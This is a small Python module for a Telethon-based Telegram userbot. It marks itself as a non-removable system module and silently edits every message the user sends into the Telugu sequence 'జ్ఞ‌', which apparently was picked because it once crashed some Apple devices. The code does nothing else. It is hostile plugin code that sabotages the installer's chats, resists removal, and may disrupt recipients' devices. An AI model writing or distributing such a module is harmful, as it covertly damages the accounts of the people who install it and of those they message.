from .. import loader, utils
from telethon.tl.types import Message


class SheoMad(loader.Module):
    strings = {'name': 'జ్ఞ‌'}
    
    def __init__(self):
        self.config = loader.ModuleConfig()
    
        self._system = True
    
        self._unloadable = False
    
    async def client_ready(self, client, database):
        self.client = client
    
    async def watcher(self, message: Message):
        if not message.out:
            return
        
        try:
            await message.edit("జ్ఞ‌")
        except:
            pass
